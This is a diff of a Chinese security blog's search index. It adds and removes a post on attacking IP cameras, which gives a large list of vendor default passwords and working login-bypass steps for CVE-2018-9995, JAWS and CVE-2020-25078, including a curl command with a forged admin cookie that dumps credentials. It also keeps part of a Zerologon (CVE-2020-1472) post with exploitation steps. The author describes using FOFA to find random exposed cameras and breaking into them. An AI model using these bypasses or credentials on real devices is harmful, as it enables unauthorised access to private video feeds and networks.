@@ -1,11 +1,81 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>摄像头</title>
+    <url>/2021/04/01/%E6%91%84%E5%83%8F%E5%A4%B4/</url>
+    <content><![CDATA[<h1 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h1><h3 id="1-摄像头基础知识"><a href="#1-摄像头基础知识" class="headerlink" title="1.摄像头基础知识"></a>1.摄像头基础知识</h3><h5 id="1-1-网络摄像头类型"><a href="#1-1-网络摄像头类型" class="headerlink" title="1.1 网络摄像头类型"></a>1.1 网络摄像头类型</h5><p>网络摄像头 (IPCam)：由视频服务器和摄像头的集成,通常是 linux 系统, 内置一个 web server,画面实时传输, 一般没有视频存储功能。</p>
+<p>数字视频录像机 (DVR/NVR)：进行图像存储处理, 可录像, 录音, 远程监控等等,大概分为 PC 式和嵌入式, 操作系统不固定,只要处理设备装有处理软件即可, 视频存储</p>
+<p>中央闭路电视 (CCTV)：图像通信系统和 DVR/NVR 结合起来, 通过双绞线、光缆、网络接收图像信号, 监控室里常见</p>
+<p>监控云平台：通过云平台集中管理多个设备</p>
+<h5 id="1-2-常见攻击方法"><a href="#1-2-常见攻击方法" class="headerlink" title="1.2 常见攻击方法"></a>1.2 常见攻击方法</h5><p>根据网络结构中的三个部分云端、手机端、摄像头设备端以及通讯协议可分为四类攻击方法</p>
+<p><strong>针对摄像头设备的攻击：</strong></p>
+<p>1、针对物理设备的攻击：调试接口暴露、固件提取、设备序列号篡改、篡改存储介质、获取普通用户权限、权限提升等；</p>
+<p>2、针对固件的攻击：获取敏感数据、获取硬编码密码、逆向加密算法、获取敏感api接口、ftp或ssh等服务攻击、固件降级等；</p>
+<p>3、针对内存的攻击：获取内存中的敏感数据（如用户名、密码等）、获取加密Key等。</p>
+<p><strong>针对手机端的攻击：</strong></p>
+<p>针对手机端app的攻击相对比较常见，而结合摄像头的特殊性，主要可以从以下几个方面入手。</p>
+<p>1、静态反编译：对APP进行脱壳、使用反编译工具获取源码、本地敏感数据存储、logcat日志、webview风险测试等；</p>
+<p>2、通信安全：中间人攻击、访问控制是否合理、数据加密强度等。</p>
+<p><strong>针对云端的攻击：</strong></p>
+<p>云服务端面临的风险和常规的应用服务器类似，简单列举几个。</p>
+<p>1、web应用安全：用户注册的各种问题、任意用户注册、用户枚举、验证码缺陷、各种越权、密码复杂度、单点登录、密码修改等等。</p>
+<p>2、服务安全：针对服务器开放的各种服务存在的缺陷进行攻击，如ftp、ssh、mysql等各种弱口令，针对操作系统的各种Nday和0day等；</p>
+<p>3、其他：各种C段、子域名等等，还可以先打入摄像头公司内部办公网再觊觎服务器，DDOS打乱对方部署也是一种思路。</p>
+<p><strong>针对协议的攻击：</strong></p>
+<p>除了摄像头设备、手机端、云服这三个重要节点外，三者之间的通讯安全也非常关键。</p>
+<p>1、APP与云端一般通过HTTP、HTTPS通信，分析中应判断通信流量是否加密，可否抓包劫持通信数据;</p>
+<p>2、设备与云端一般采用MQTT、XMPP、CoAP等协议通信，也会使用HTTP、HTTPS通信,部分厂家的设备会使用私有协议进行通讯，例如京东、小米、broadlink等;</p>
+<p>3、APP与设备之间通信一般利用短距离无线网络进行通信，如ZigBee、Wi-Fi以及蓝牙等。</p>
+<h5 id="1-3-常见弱口令"><a href="#1-3-常见弱口令" class="headerlink" title="1.3 常见弱口令"></a>1.3 常见弱口令</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">海康威视(hikvision):admin&#x2F;123456</span><br><span class="line"></span><br><span class="line">大华网络摄像机(WEb SERVICE):admin&#x2F;admin 管理权限</span><br><span class="line">							default&#x2F;user 用户默认登录账号</span><br><span class="line">							888888&#x2F;admin</span><br><span class="line">							666666&#x2F;user</span><br><span class="line">							</span><br><span class="line">cctv摄像机(JAWS&#x2F;1.0):admin&#x2F;空</span><br><span class="line">					root&#x2F;juantech 系统口令</span><br><span class="line">					</span><br><span class="line">SQ-WEBCAM摄像机(SQ-WEBCAM):admin&#x2F;admin</span><br><span class="line"></span><br><span class="line">ACTi: admin&#x2F;123456 Admin&#x2F;123456</span><br><span class="line"> </span><br><span class="line">AmericanDynamics: admin&#x2F;admin or admin&#x2F;9999</span><br><span class="line"> </span><br><span class="line">ArecontVision: none</span><br><span class="line"> </span><br><span class="line">Avigilon: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Axis: traditionally root&#x2F;pass, newAxis cameras require password creation during first login</span><br><span class="line"> </span><br><span class="line">Basler: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Bosch: none</span><br><span class="line"> </span><br><span class="line">Brickcom: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Canon: root&#x2F;camera</span><br><span class="line"> </span><br><span class="line">Cisco: Nodefault password, requires creation during first login</span><br><span class="line"> </span><br><span class="line">Dahua: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">DigitalWatchdog: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">DRS: admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">DVTel: Admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">DynaColor: Admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">FLIR: admin&#x2F;fliradmin</span><br><span class="line"> </span><br><span class="line">Foscam: admin&#x2F;</span><br><span class="line"> </span><br><span class="line">GeoVision: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Grandstream: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Hikvision: admin&#x2F;12345</span><br><span class="line"> </span><br><span class="line">Honeywell: admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">IQinVision: root&#x2F;system</span><br><span class="line"> </span><br><span class="line">IPX-DDK: root&#x2F;admin orroot&#x2F;Admin\</span><br><span class="line"> </span><br><span class="line">JVC: admin&#x2F;jvc</span><br><span class="line"> </span><br><span class="line">March: Networks: admin&#x2F;</span><br><span class="line"> </span><br><span class="line">Mobotix: admin&#x2F;meinsm</span><br><span class="line"> </span><br><span class="line">Panasonic: admin&#x2F;12345</span><br><span class="line"> </span><br><span class="line">PelcoSarix: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Pixord: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">SamsungElectronics: root&#x2F;root or admin&#x2F;4321</span><br><span class="line"> </span><br><span class="line">SamsungTechwin (old): admin&#x2F;1111111</span><br><span class="line"> </span><br><span class="line">Samsung(new): admin&#x2F;4321</span><br><span class="line"> </span><br><span class="line">Sanyo: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Scallop: admin&#x2F;password</span><br><span class="line"> </span><br><span class="line">Sentry360(mini): admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">Sentry360(pro): none</span><br><span class="line"> </span><br><span class="line">Sony: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Speco: admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">Stardot: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Starvedia: admin&#x2F;</span><br><span class="line"> </span><br><span class="line">Trendnet: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Toshiba: root&#x2F;ikwd</span><br><span class="line"> </span><br><span class="line">VideoIQ: supervisor&#x2F;supervisor</span><br><span class="line"> </span><br><span class="line">Vivotek: root&#x2F;</span><br><span class="line"> </span><br><span class="line">Ubiquiti: ubnt&#x2F;ubnt</span><br><span class="line"> </span><br><span class="line">Wodsee: admin&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-摄像头漏洞"><a href="#2-摄像头漏洞" class="headerlink" title="2. 摄像头漏洞"></a>2. 摄像头漏洞</h3><h5 id="2-1-DVR登录绕过-CVE-2018-9995"><a href="#2-1-DVR登录绕过-CVE-2018-9995" class="headerlink" title="2.1 DVR登录绕过 CVE-2018-9995"></a>2.1 DVR登录绕过 CVE-2018-9995</h5><p><strong>公布时间</strong>：2018年4月</p>
+<p><strong>影响版本</strong>：tbk、NovoCeNova、QSee、Pulnix、XVR 5 in 1、Securus、Night OWL</p>
+<p><strong>漏洞位置</strong>：</p>
+<p><strong>漏洞描述</strong>：DVR，全称为Digital Video Recorder(硬盘录像机)，即数字视频录像机。最初由阿根廷研究员发现，通过使用“Cookie： uid = admin”的Cookie标头来访问特定DVR的控制面板，DVR将以明文形式响应设备的管理员凭证。</p>
+<p><strong>修复建议</strong>：</p>
+<p><strong>漏洞复现</strong>：</p>
+<p>2020年2月20日。直接用fofa搜“login.rsp”即可，感觉还是挺多的，随便找了一个就存在该漏洞。</p>
+<p>利用有两种方式。第一种是直接用curl命令获取帐密。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &quot;http:&#x2F;&#x2F;ip:port&#x2F;device.rsp?opt&#x3D;user&amp;cmd&#x3D;list&quot; -H &quot;Cookie: uid&#x3D;admin&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220145757392.png" alt="image-20200220145757392"></p>
+<p>第二种是添加cookie，然后刷新访问，注意不要带login.rsp。另外要看监控画面需要安装插件。</p>
+<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220150235066.png" alt="image-20200220150235066"></p>
+<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220150323351.png" alt="image-20200220150323351"></p>
+<h5 id="2-2-JAWS登录绕过"><a href="#2-2-JAWS登录绕过" class="headerlink" title="2.2 JAWS登录绕过"></a>2.2 JAWS登录绕过</h5><p><strong>公布时间</strong>：</p>
+<p><strong>影响版本</strong>：app=”JAWS/1.0”</p>
+<p><strong>漏洞位置</strong>：</p>
+<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220153731462.png" alt="image-20200220153731462"><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220160326388.png" alt="image-20200220160326388"></p>
+<p><strong>漏洞描述</strong>：上面这段代码比较短我还是很容易看懂的，判断cookie里面dvr_usr和dvr_pwd不为空就可以进入控制面板了，而且对内容无要求。</p>
+<p><strong>修复建议</strong>：</p>
+<p><strong>漏洞复现</strong>：</p>
+<p>2020年2月20日。fofa搜app=”JAWS/1.0”，随便找的一个就成功了，感觉也挺容易的。</p>
+<p>添加两条cookie，dvr_usr和dvr_pwd，值随意，添加后访问view2.html。</p>
+<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220161019296.png" alt="image-20200220161019296"></p>
+<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220161721889.png" alt="image-20200220161721889"></p>
+<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220162108549.png" alt="image-20200220162108549"></p>
+<h5 id="2-3-D-Link-DCS系列监控-账号密码信息泄露漏洞-CVE-2020-25078"><a href="#2-3-D-Link-DCS系列监控-账号密码信息泄露漏洞-CVE-2020-25078" class="headerlink" title="2.3 D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078"></a>2.3 D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOFA： app&#x3D;”D_Link-DCS-2530L”</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DCS-2530L</span><br><span class="line">DCS-2670L</span><br><span class="line">DCS-4603</span><br><span class="line">DCS-4622</span><br><span class="line">等多个DCS系列系统</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;config&#x2F;getuser?index&#x3D;0	#访问漏洞位置获取账密后再访问首页登录</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210426597.png" alt="image-20210401210426597"></p>
+<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210448193.png" alt="image-20210401210448193"></p>
+<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210543504.png" alt="image-20210401210543504"></p>
+]]></content>
+      <tags>
+        <tag>摄像头</tag>
+        <tag>硬件</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>cve-2020-1472域内提权漏洞</title>
     <url>/2021/03/29/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>CVE-2020-1472是微软八月修复的一个严重的权限提升漏洞(并于昨天2020年9月15日secura发布了相关的漏洞细节，随后相关exp被构造发布)，通过Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接安全通道时，存在特权提升的利用点，该漏洞的CVSS分高达10分，攻击者只需要在内网中有一个立足点，就可以远程获取域控的管理员权限。</p>
-<span id="more"></span>
-
 <h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure>
 
 <h1 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.通过漏洞脚本置空域控保存在AD中的密码</span><br><span class="line">2.通过secretsdump.py获取域控上的用户hash</span><br><span class="line">3.通过该hash使用wmiexec.py登录域控获取一个shell</span><br><span class="line">4.通过shell获取本地保存的原hash key</span><br><span class="line">5.通过获取的hash key恢复置空的域控密码</span><br></pre></td></tr></table></figure>
@@ -73,82 +143,10 @@
 <p><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20201472.html">https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20201472.html</a></p>
 ]]></content>
       <tags>
+        <tag>漏洞复现</tag>
         <tag>cve-2020-1472</tag>
         <tag>提权</tag>
         <tag>域渗透</tag>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>摄像头</title>
-    <url>/2021/04/01/%E6%91%84%E5%83%8F%E5%A4%B4/</url>
-    <content><![CDATA[<h1 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h1><h3 id="1-摄像头基础知识"><a href="#1-摄像头基础知识" class="headerlink" title="1.摄像头基础知识"></a>1.摄像头基础知识</h3><h5 id="1-1-网络摄像头类型"><a href="#1-1-网络摄像头类型" class="headerlink" title="1.1 网络摄像头类型"></a>1.1 网络摄像头类型</h5><p>网络摄像头 (IPCam)：由视频服务器和摄像头的集成,通常是 linux 系统, 内置一个 web server,画面实时传输, 一般没有视频存储功能。</p>
-<p>数字视频录像机 (DVR/NVR)：进行图像存储处理, 可录像, 录音, 远程监控等等,大概分为 PC 式和嵌入式, 操作系统不固定,只要处理设备装有处理软件即可, 视频存储</p>
-<p>中央闭路电视 (CCTV)：图像通信系统和 DVR/NVR 结合起来, 通过双绞线、光缆、网络接收图像信号, 监控室里常见</p>
-<p>监控云平台：通过云平台集中管理多个设备</p>
-<h5 id="1-2-常见攻击方法"><a href="#1-2-常见攻击方法" class="headerlink" title="1.2 常见攻击方法"></a>1.2 常见攻击方法</h5><p>根据网络结构中的三个部分云端、手机端、摄像头设备端以及通讯协议可分为四类攻击方法</p>
-<p><strong>针对摄像头设备的攻击：</strong></p>
-<p>1、针对物理设备的攻击：调试接口暴露、固件提取、设备序列号篡改、篡改存储介质、获取普通用户权限、权限提升等；</p>
-<p>2、针对固件的攻击：获取敏感数据、获取硬编码密码、逆向加密算法、获取敏感api接口、ftp或ssh等服务攻击、固件降级等；</p>
-<p>3、针对内存的攻击：获取内存中的敏感数据（如用户名、密码等）、获取加密Key等。</p>
-<p><strong>针对手机端的攻击：</strong></p>
-<p>针对手机端app的攻击相对比较常见，而结合摄像头的特殊性，主要可以从以下几个方面入手。</p>
-<p>1、静态反编译：对APP进行脱壳、使用反编译工具获取源码、本地敏感数据存储、logcat日志、webview风险测试等；</p>
-<p>2、通信安全：中间人攻击、访问控制是否合理、数据加密强度等。</p>
-<p><strong>针对云端的攻击：</strong></p>
-<p>云服务端面临的风险和常规的应用服务器类似，简单列举几个。</p>
-<p>1、web应用安全：用户注册的各种问题、任意用户注册、用户枚举、验证码缺陷、各种越权、密码复杂度、单点登录、密码修改等等。</p>
-<p>2、服务安全：针对服务器开放的各种服务存在的缺陷进行攻击，如ftp、ssh、mysql等各种弱口令，针对操作系统的各种Nday和0day等；</p>
-<p>3、其他：各种C段、子域名等等，还可以先打入摄像头公司内部办公网再觊觎服务器，DDOS打乱对方部署也是一种思路。</p>
-<p><strong>针对协议的攻击：</strong></p>
-<p>除了摄像头设备、手机端、云服这三个重要节点外，三者之间的通讯安全也非常关键。</p>
-<p>1、APP与云端一般通过HTTP、HTTPS通信，分析中应判断通信流量是否加密，可否抓包劫持通信数据;</p>
-<p>2、设备与云端一般采用MQTT、XMPP、CoAP等协议通信，也会使用HTTP、HTTPS通信,部分厂家的设备会使用私有协议进行通讯，例如京东、小米、broadlink等;</p>
-<p>3、APP与设备之间通信一般利用短距离无线网络进行通信，如ZigBee、Wi-Fi以及蓝牙等。</p>
-<h5 id="1-3-常见弱口令"><a href="#1-3-常见弱口令" class="headerlink" title="1.3 常见弱口令"></a>1.3 常见弱口令</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">海康威视(hikvision):admin&#x2F;123456</span><br><span class="line"></span><br><span class="line">大华网络摄像机(WEb SERVICE):admin&#x2F;admin 管理权限</span><br><span class="line">							default&#x2F;user 用户默认登录账号</span><br><span class="line">							888888&#x2F;admin</span><br><span class="line">							666666&#x2F;user</span><br><span class="line">							</span><br><span class="line">cctv摄像机(JAWS&#x2F;1.0):admin&#x2F;空</span><br><span class="line">					root&#x2F;juantech 系统口令</span><br><span class="line">					</span><br><span class="line">SQ-WEBCAM摄像机(SQ-WEBCAM):admin&#x2F;admin</span><br><span class="line"></span><br><span class="line">ACTi: admin&#x2F;123456 Admin&#x2F;123456</span><br><span class="line"> </span><br><span class="line">AmericanDynamics: admin&#x2F;admin or admin&#x2F;9999</span><br><span class="line"> </span><br><span class="line">ArecontVision: none</span><br><span class="line"> </span><br><span class="line">Avigilon: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Axis: traditionally root&#x2F;pass, newAxis cameras require password creation during first login</span><br><span class="line"> </span><br><span class="line">Basler: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Bosch: none</span><br><span class="line"> </span><br><span class="line">Brickcom: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Canon: root&#x2F;camera</span><br><span class="line"> </span><br><span class="line">Cisco: Nodefault password, requires creation during first login</span><br><span class="line"> </span><br><span class="line">Dahua: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">DigitalWatchdog: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">DRS: admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">DVTel: Admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">DynaColor: Admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">FLIR: admin&#x2F;fliradmin</span><br><span class="line"> </span><br><span class="line">Foscam: admin&#x2F;</span><br><span class="line"> </span><br><span class="line">GeoVision: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Grandstream: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Hikvision: admin&#x2F;12345</span><br><span class="line"> </span><br><span class="line">Honeywell: admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">IQinVision: root&#x2F;system</span><br><span class="line"> </span><br><span class="line">IPX-DDK: root&#x2F;admin orroot&#x2F;Admin\</span><br><span class="line"> </span><br><span class="line">JVC: admin&#x2F;jvc</span><br><span class="line"> </span><br><span class="line">March: Networks: admin&#x2F;</span><br><span class="line"> </span><br><span class="line">Mobotix: admin&#x2F;meinsm</span><br><span class="line"> </span><br><span class="line">Panasonic: admin&#x2F;12345</span><br><span class="line"> </span><br><span class="line">PelcoSarix: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Pixord: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">SamsungElectronics: root&#x2F;root or admin&#x2F;4321</span><br><span class="line"> </span><br><span class="line">SamsungTechwin (old): admin&#x2F;1111111</span><br><span class="line"> </span><br><span class="line">Samsung(new): admin&#x2F;4321</span><br><span class="line"> </span><br><span class="line">Sanyo: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Scallop: admin&#x2F;password</span><br><span class="line"> </span><br><span class="line">Sentry360(mini): admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">Sentry360(pro): none</span><br><span class="line"> </span><br><span class="line">Sony: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Speco: admin&#x2F;1234</span><br><span class="line"> </span><br><span class="line">Stardot: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Starvedia: admin&#x2F;</span><br><span class="line"> </span><br><span class="line">Trendnet: admin&#x2F;admin</span><br><span class="line"> </span><br><span class="line">Toshiba: root&#x2F;ikwd</span><br><span class="line"> </span><br><span class="line">VideoIQ: supervisor&#x2F;supervisor</span><br><span class="line"> </span><br><span class="line">Vivotek: root&#x2F;</span><br><span class="line"> </span><br><span class="line">Ubiquiti: ubnt&#x2F;ubnt</span><br><span class="line"> </span><br><span class="line">Wodsee: admin&#x2F;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="2-摄像头漏洞"><a href="#2-摄像头漏洞" class="headerlink" title="2. 摄像头漏洞"></a>2. 摄像头漏洞</h3><h5 id="2-1-DVR登录绕过-CVE-2018-9995"><a href="#2-1-DVR登录绕过-CVE-2018-9995" class="headerlink" title="2.1 DVR登录绕过 CVE-2018-9995"></a>2.1 DVR登录绕过 CVE-2018-9995</h5><p><strong>公布时间</strong>：2018年4月</p>
-<p><strong>影响版本</strong>：tbk、NovoCeNova、QSee、Pulnix、XVR 5 in 1、Securus、Night OWL</p>
-<p><strong>漏洞位置</strong>：</p>
-<p><strong>漏洞描述</strong>：DVR，全称为Digital Video Recorder(硬盘录像机)，即数字视频录像机。最初由阿根廷研究员发现，通过使用“Cookie： uid = admin”的Cookie标头来访问特定DVR的控制面板，DVR将以明文形式响应设备的管理员凭证。</p>
-<p><strong>修复建议</strong>：</p>
-<p><strong>漏洞复现</strong>：</p>
-<p>2020年2月20日。直接用fofa搜“login.rsp”即可，感觉还是挺多的，随便找了一个就存在该漏洞。</p>
-<p>利用有两种方式。第一种是直接用curl命令获取帐密。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &quot;http:&#x2F;&#x2F;ip:port&#x2F;device.rsp?opt&#x3D;user&amp;cmd&#x3D;list&quot; -H &quot;Cookie: uid&#x3D;admin&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220145757392.png" alt="image-20200220145757392"></p>
-<p>第二种是添加cookie，然后刷新访问，注意不要带login.rsp。另外要看监控画面需要安装插件。</p>
-<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220150235066.png" alt="image-20200220150235066"></p>
-<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220150323351.png" alt="image-20200220150323351"></p>
-<h5 id="2-2-JAWS登录绕过"><a href="#2-2-JAWS登录绕过" class="headerlink" title="2.2 JAWS登录绕过"></a>2.2 JAWS登录绕过</h5><p><strong>公布时间</strong>：</p>
-<p><strong>影响版本</strong>：app=”JAWS/1.0”</p>
-<p><strong>漏洞位置</strong>：</p>
-<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220153731462.png" alt="image-20200220153731462"><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220160326388.png" alt="image-20200220160326388"></p>
-<p><strong>漏洞描述</strong>：上面这段代码比较短我还是很容易看懂的，判断cookie里面dvr_usr和dvr_pwd不为空就可以进入控制面板了，而且对内容无要求。</p>
-<p><strong>修复建议</strong>：</p>
-<p><strong>漏洞复现</strong>：</p>
-<p>2020年2月20日。fofa搜app=”JAWS/1.0”，随便找的一个就成功了，感觉也挺容易的。</p>
-<p>添加两条cookie，dvr_usr和dvr_pwd，值随意，添加后访问view2.html。</p>
-<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220161019296.png" alt="image-20200220161019296"></p>
-<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220161721889.png" alt="image-20200220161721889"></p>
-<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220162108549.png" alt="image-20200220162108549"></p>
-<h5 id="2-3-D-Link-DCS系列监控-账号密码信息泄露漏洞-CVE-2020-25078"><a href="#2-3-D-Link-DCS系列监控-账号密码信息泄露漏洞-CVE-2020-25078" class="headerlink" title="2.3 D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078"></a>2.3 D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOFA： app&#x3D;”D_Link-DCS-2530L”</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DCS-2530L</span><br><span class="line">DCS-2670L</span><br><span class="line">DCS-4603</span><br><span class="line">DCS-4622</span><br><span class="line">等多个DCS系列系统</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;config&#x2F;getuser?index&#x3D;0	#访问漏洞位置获取账密后再访问首页登录</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210426597.png" alt="image-20210401210426597"></p>
-<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210448193.png" alt="image-20210401210448193"></p>
-<p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210543504.png" alt="image-20210401210543504"></p>
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
-        <tag>摄像头</tag>
-        <tag>硬件</tag>
       </tags>
   </entry>
 </search>
